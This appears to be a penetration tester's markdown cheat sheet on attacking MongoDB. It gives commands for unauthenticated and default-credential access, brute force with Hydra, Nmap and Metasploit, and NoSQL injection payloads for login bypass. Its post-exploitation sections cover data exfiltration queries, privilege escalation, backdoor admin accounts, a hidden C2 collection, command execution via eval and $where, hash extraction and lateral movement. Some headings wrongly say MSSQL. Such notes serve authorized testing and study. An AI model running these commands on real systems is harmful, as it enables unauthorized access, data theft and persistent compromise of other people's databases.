---
id: Exploitation
aliases: []
tags:
  - Networking/Services/MongoDB/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Credentials {{{-->
## Credentials

<!-- No Authentication {{{-->
### No Authentication

[[Usage#Connect|Connect]] and test if authentication is required

```sh
mongosh "mongodb://$target:<port>"
```

```sh
mongo $target:27017
```
```sh
mongo $target:27017 --eval "db.adminCommand('listDatabases')"
```
```sh
mongo $target:27017/database_name --eval "db.collection.find()"
```

<!-- }}} -->

<!-- Default Credentials {{{-->
### Default Credentials

Many MongoDB installations use weak default credentials

[[Usage#Connect|Connect]] with common default credentials

<!-- Default Credentials {{{-->
> [!tip]- Default Credentials
>
> ```sh
> admin:admin
> admin:password
> root:root
> mongodb:mongodb
> user:user
> ```
<!-- }}} -->

```sh
mongo -u admin -p admin $target/admin
```
```sh
mongo -u root -p password $target
```

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute force MSSQL service

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[RockYou]]
>
<!-- }}} -->

[[Hydra]]

```sh
hydra -l admin -P <wordlist> $target mongodb
```

[[Nmap]]

```sh
nmap $target -p 27017 --script mongodb-brute -oA mongodb-script-brute
```

<!-- Info {{{-->
> [!info]-
>
> - `mssql.domain=<DOMAIN>`: Use the NetBIOS name of the machine as domain
<!-- }}} -->

[[Metasploit]] — MongoDB Login Utility
(*[mongodb_login](https://www.rapid7.com/db/modules/auxiliary/scanner/mongodb/mongodb_login/)*)

```sh
use auxiliary/scanner/mongodb/mongodb_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mongodb/mongodb_login
> msf auxiliary(mongodb_login) > show actions
>     ...actions...
> msf auxiliary(mongodb_login) > set ACTION < action-name >
> msf auxiliary(mongodb_login) > show options
>     ...show and set options...
> msf auxiliary(mongodb_login) > set RHOSTS target.com
> msf auxiliary(mongodb_login) > set USERNAME admin
> msf auxiliary(mongodb_login) > set PASS_FILE passwords.txt
> msf auxiliary(mongodb_login) > run
> ```
<!-- }}} -->


<!-- }}} -->

___
<!-- }}} -->

<!-- NoSQL Injection {{{-->
## NoSQL Injection

NoSQL injection attacks exploit vulnerabilities in MongoDB query construction,
allowing attackers to bypass authentication or extract sensitive data

<!-- NoSQL Injection Payloads {{{-->
> [!tip]- NoSQL Injection Payloads
>
> Authentication bypass
>
> ```sh
> {"$ne": null}
> {"$ne": ""}
> {"$gt": ""}
> {"$regex": ".*"}
> {"$exists": true}
> ```
>
> OR operator
>
> ```sh
> {"$or": [{"username": "admin"}, {"username": "user"}]}
> ```
>
> IN operator
>
> ```sh
> {"$in": ["admin", "user", "root"]}
> ```
>
> NIN operator (*not in*)
>
> ```sh
> {"$nin": ["invalid"]}
> ```
>
> WHERE operator
>
> ```sh
> {"$where": "1==1"}
> ```
> ```sh
> {"$where": "sleep(5000)"}
> ```
>
> Regex
>
> ```sh
> {"$regex": "^admin"}
> ```
> ```sh
> {"$regex": ".*"}
> ```
>
> Array manipulation
>
> ```sh
> {"$elemMatch": {"$ne": null}}
> ```
>
<!-- }}} -->

In login forms with MongoDB queries

```sh
username[$ne]=null&password[$ne]=null
{"username": {"$ne": null}, "password": {"$ne": null}}
```

```sh
{"username": {"$in": ["admin", "user"]}, "password": {"$ne": null}}
```

```sh
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

```sh
{"username": "admin", "password": {"$where": "this.password.match(/.*/);"}}
```

```sh
' || '1'=='1
' || 1==1//
' || 1==1%00
admin' || '1'=='1
{"$gt": ""}
{"$ne": ""}
{"$nin": []}
username[$nin][]=invalid&password[$ne]=null
```

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

<!-- Server {{{-->
### Server

Identify server version (*e.g., name, build, host, etc.*)

```sql
db.version()
```

Server Status

```sql
db.serverStatus()
```

Server Build Info

```sql
db.serverBuildInfo()
```

Host Info

```sql
db.hostInfo()
```

Command Line Options

```sql
db.adminCommand({getCmdLineOpts: 1})
```

<!-- Configuration {{{-->
#### Configuration

Get all configuration

```sh
db.adminCommand({getParameter: '*'})
```

Authentication mechanisms

```sh
db.adminCommand({getParameter: 1, authenticationMechanisms: 1})
```

Network settings

```sh
db.adminCommand({getParameter: 1, bindIp: 1})
```

```sh
db.adminCommand({getParameter: 1, port: 1})
```

Check if authentication is enabled

```sh
db.adminCommand({getCmdLineOpts: 1}).parsed.security
```
<!-- }}} -->

<!-- Users {{{-->
#### Users

List users (*requires admin*)

```sh
use admin
```
```sh
db.system.users.find()
```
```sh
db.getUsers()
```

List all users across databases

```sh
db.adminCommand({usersInfo: {forAllDBs: true}})
```

Current user

```sh
db.runCommand({connectionStatus: 1})
```

User roles

```sh
db.getRoles({showBuiltinRoles: true})
```

<!-- }}} -->

___
<!-- }}} -->


<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data from MSSQL databases


Find sensitive data in [[Usage#Collections|Collections]]

```sql
db.getCollectionNames().filter(c =>
    c.match(/user|password|credential|token|key|secret|admin/i)
)
```

Search documents for credentials

```sql
db.users.find({}, {password: 1, email: 1, token: 1})
```

```sql
db.config.find({}, {api_key: 1, secret: 1, password: 1})
```

Sample documents from collections

```sql
db.getCollectionNames().forEach(function(c) {
    print("Collection: " + c);
    printjson(db[c].findOne());
})
```

___
<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Gain administrative privileges by creating new admin users or modifying existing user roles

Create Admin User

```sql
use admin
```

```sql
db.createUser({
    user: "backdoor",
    pwd: "P@ssw0rd123!",
    roles: [{role: "root", db: "admin"}]
})
```

Grant Roles To Existing User

```sql
db.grantRolesToUser("<user>", [{role: "root", db: "admin"}])
```

Modify User Password

```sql
db.changeUserPassword("<user>", "<password>")
```

Update User Roles (*Requires admin*)

```sql
db.system.users.update(
    {user: "username"},
    {$set: {roles: [{role: "root", db: "admin"}]}}
)
```
___
<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Maintain long-term access through backdoor admin accounts and hidden collections

Create Backdoor Admin User

```sql
use admin
db.createUser({
    user: "system_service",
    pwd: "ComplexBackdoor123!",
    roles: [
        {role: "root", db: "admin"},
        {role: "userAdminAnyDatabase", db: "admin"}
    ]
})
```

Create Hidden Collection for C2

```sql
use admin
db.createCollection(".system_config")
db[".system_config"].insert({cmd: "whoami", output: ""})
```

Store Backdoor JavaScript Function

```sql
db.system.js.save({
    _id: "backdoor_function",
    value: function() {
        // Backdoor code
        return "OK";
    }
})
```

___
<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

Execute system commands directly from the MongoDB shell
using `eval` and `$where` operators
(*deprecated in newer versions*)

Check if JavaScript Execution Enabled

```sh
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
```

Execute System Commands

```sh
// Requires special configuration
db.runCommand({
    eval: "function() { return run('whoami'); }",
    nolock: true
})
```

Using $where for Command Execution
(*deprecated but might work*)

```sql
db.collection.find({$where: "return shellHelper.run('whoami')"})
```

___
<!-- }}} -->

<!-- Password Hash Extraction {{{-->
## Password Hash Extraction

Extract password hashes from the user collection for offline cracking

Extract User Hashes (*requires admin*)

```sql
use admin
```

```sql
db.system.users.find()
```

Format Hashes For Cracking

```sql
db.system.users.find().forEach(function(u) {
    print(u.user + ":" + u.credentials["SCRAM-SHA-1"].storedKey);
})
```

[[Usage#Mongo Tools|mongoexport]] — Export Hashes To File

```sh
mongoexport --host $target --db admin --collection system.users \
    --username admin --password password \
    --out user_hashes.json
```

___
<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Lateral movement involves using compromised MongoDB access
to discover and access other systems within the network

Extract Connection Strings

```sh
db.config.find()
```
```sh
db.settings.find()
```

Search for Credentials in Collections

```sh
db.users.find({}, {password: 1, email: 1})
```
```sh
db.config.find({}, {api_key: 1, secret: 1})
```

Check Database Queries for Connections

```sh
db.system.profile.find({op: "query"}).forEach(function(doc) {
    printjson(doc);
})
```

___
<!-- }}} -->

<!-- }}} -->
